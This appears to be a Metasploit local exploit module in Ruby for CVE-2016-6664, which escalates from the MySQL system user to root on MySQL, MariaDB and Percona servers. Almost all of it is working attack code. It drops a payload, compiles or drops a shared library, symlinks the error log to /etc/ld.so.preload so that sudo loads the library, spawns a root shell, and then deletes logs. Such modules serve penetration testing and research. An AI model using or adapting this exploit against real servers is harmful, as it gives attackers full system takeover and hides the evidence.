##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require "msf/core"

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
        'Name'           => 'MySQL / MariaDB / Percona   -   Root Privilege Escalation',
        'Description'    => %q{
          MySQL-based databases including MySQL, MariaDB and Percona are affected
          by a privilege escalation vulnerability which can let attackers who have
          gained access to mysql system user to further escalate their privileges
          to root user allowing them to fully compromise the system.
          The vulnerability stems from unsafe file handling of error logs and other files.

          MySQL
	           <= 5.5.51
	           <= 5.6.32
	           <= 5.7.14

          MariaDB
	           All current

          Percona Server
	           < 5.5.51-38.2
	           < 5.6.32-78-1
	           < 5.7.14-8

          Percona XtraDB Cluster
	           < 5.6.32-25.17
	           < 5.7.14-26.17
	           < 5.5.41-37.0
        },
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'se4quake <se4quake@gmail.com>',  # Module
            'Dawid Golunski'                  # Discovery
          ],
        'DisclosureDate' => 'Nov 01 2016',
        'Platform'       => [ 'linux'],
        'SessionTypes'  => ['shell', 'meterpreter'],
        'Targets'       =>
          [
            ['Linux x86', {'Arch' => ARCH_X86}],
            ['Linux x86_64', {'Arch' => ARCH_X86_64}]
          ],
        'DefaultTarget'  => 0,
        'DefaultOptions' =>
        {
          #'PrependSetresuid' => true,
          #'PrependFork' => true,
          'DisablePayloadHandler' => true
        },
        'References'     =>
          [
            [ 'EDB', '40679'],
            [ 'CVE', '2016-6664'],
            [ 'URL', 'https://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html']
          ]
      ))
    register_options(
      [
        OptString.new('ErrorLog', [ true, 'The error log file', '/var/log/mysql/error.log' ]),
        OptString.new('WritableDir', [ true, 'A directory where we can write files (must not be mounted noexec)', '/tmp' ]),
        OptString.new('BackdoorShell', [ true, 'The shell path', '/bin/bash' ]),
        OptString.new('Sudo', [ true, 'The sudo path', '/usr/bin/sudo' ]),
        OptString.new('MysqlDaemon', [ true, 'The mysqld process name', 'mysqld' ]),
        OptBool.new('KillMysqld', [ true, 'Kill mysqld process for fast exploitation', false ]),
        OptEnum.new('Compile', [ true, 'Compile on target', 'Auto', ['Auto', 'True', 'False']])
      ], self.class)
  end

  def check

    def check_reqs?()
      check_command = 'if which sudo && '
      check_command << 'which mysqld; '
      check_command << 'then echo OK; '
      check_command << 'fi'

      output = cmd_exec(check_command).gsub("\r", '')

      vprint_status(output)

      if output['OK'] == 'OK'
        return true
      end
      false
    end

    def mysql_user?()
      # test for mysql user
      mysql = cmd_exec("id | grep -E '(mysql)'")
      if not mysql.include?("mysql")
        print_error "The current session user (#{mysql})is not mysql"
        return false
      end
      true
    end

    def preload_exists?()
      if exists?("/etc/ld.so.preload")
        print_error "Found ld.so.preload. Exiting for safety."
        return true
      end
      false
    end

    if preload_exists?
      return CheckCode::Detected
    end

    if check_reqs? and mysql_user?
      return CheckCode::Appears
    end

    CheckCode::Safe
  end

  def exploit
    # first thing we need to do is determine our method of exploitation: compiling realtime, or droping a pre-compiled version.
    def has_prereqs?()
      vprint_status('Checking if 32bit C libraries, gcc-multilib, and gcc are installed')
      if target.name == "Ubuntu"
        lib = cmd_exec('dpkg --get-selections | grep libc6-dev-i386')
        if lib.include?('install')
          vprint_good('libc6-dev-i386 is installed')
        else
          print_error('libc6-dev-i386 is not installed.  Compiling will fail.')
        end
        multilib = cmd_exec('dpkg --get-selections | grep ^gcc-multilib')
        if multilib.include?('install')
          vprint_good('gcc-multilib is installed')
        else
          print_error('gcc-multilib is not installed.  Compiling will fail.')
        end
        gcc = cmd_exec('which gcc')
        if gcc.include?('gcc')
          vprint_good('gcc is installed')
        else
          print_error('gcc is not installed.  Compiling will fail.')
        end
        return gcc.include?('gcc') && lib.include?('install') && multilib.include?('install')
      else
        return false
      end
    end
    compile = has_prereqs?
    if datastore['Compile'] == 'Auto' || datastore['Compile'] == 'True'
      if has_prereqs?()
        compile = true
        vprint_status('Live compiling exploit on system')
      else
        vprint_status('Dropping pre-compiled exploit on system')
      end
    end

    if check != CheckCode::Appears
      fail_with(Failure::NotVulnerable, 'Target not vulnerable! punt!')
    end

    # build file names and locations
    privesclib_file = datastore["WritableDir"] + "/" + rand_text_alphanumeric(8) + ".so"
    privescsrc_file = datastore["WritableDir"] + "/" + rand_text_alphanumeric(8) + ".c"
    pwn_file = datastore["WritableDir"] + "/" + rand_text_alphanumeric(8)
    payload_path = datastore["WritableDir"] + rand_text_alpha(8)
    backdoorsh = datastore["BackdoorShell"]
    backdoorpath = datastore["WritableDir"] + "/" + rand_text_alphanumeric(8)
    suidbin = datastore["Sudo"]
    error_log_file = datastore["ErrorLog"]
    mysqld = datastore["MysqlDaemon"]

    # lets write our payload since everythings set for priv esc
    vprint_status("Writing payload to #{payload_path}")
    write_file(payload_path, generate_payload_exe)
    cmd_exec("chmod 555 #{payload_path}")
    register_file_for_cleanup(payload_path)

    # setup the files
    rm_f pwn_file
    if compile
      vprint_status "Writing pwn source to #{privescsrc_file}"
      rm_f privescsrc_file
      write_file(privescsrc_file, pwn)
      cmd_exec("gcc -Wall -fPIC -shared -o #{privesclib_file} #{privescsrc_file} -ldl")
      register_file_for_cleanup(privescsrc_file)
    else
      # privesclib.so file
      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-6664', '2016-6664.out')
      fd = ::File.open( path, "rb")
      privesclib = fd.read(fd.stat.size)
      fd.close
      vprint_status "Writing privesclib to #{privesclib_file}"
      backdoorpath = "/tmp/mysqlrootsh" # hardcoded into privesclib.so
      write_file(privesclib_file, privesclib)
    end
    register_file_for_cleanup(backdoorpath)

    def do_pwn(privesclib_file, suidbin, backdoorpath, payload_path)
      print_status "Executing escalation."
      do_cmd_exec("echo #{privesclib_file} > /etc/ld.so.preload")
      do_cmd_exec("chmod 755 /etc/ld.so.preload")
      do_cmd_exec("#{suidbin} 2>/dev/null >/dev/null")
      do_cmd_exec("#{backdoorpath} -p -c \"rm -f /etc/ld.so.preload; rm -f #{privesclib_file}\"")
      do_cmd_exec("#{backdoorpath} -p")
    end

    def do_cleanup(error_log_file)
      cmd_exec("rm -f #{error_log_file}")
      cmd_exec("touch -f #{error_log_file}")
      cmd_exec("if [ -f /etc/ld.so.preload ]; then echo -n > /etc/ld.so.preload; fi")
      vprint_status "Cleanup done."
    end

    def do_cmd_exec(cmd)
      vprint_status cmd
      r = cmd_exec(cmd)
      if r != ""
        print_status r
      end
    end

    vprint_status "Seting up the preload trap"
    do_cmd_exec("cp #{backdoorsh} #{backdoorpath}")
    do_cmd_exec("rm #{error_log_file} && ln -s /etc/ld.so.preload #{error_log_file}")
    if datastore["KillMysqld"]
      do_cmd_exec("killall #{mysqld}")
    end

    print_status "Waiting for mysqld to restart..."
    cmd_exec("while :; do { sleep 0.1; if [ -f /etc/ld.so.preload ]; then { echo #{privesclib_file} > /etc/ld.so.preload; rm -f #{error_log_file}; break; } fi } done", nil, 125)

    do_pwn(privesclib_file, suidbin, backdoorpath, payload_path)
    do_cleanup(error_log_file)

  end
end
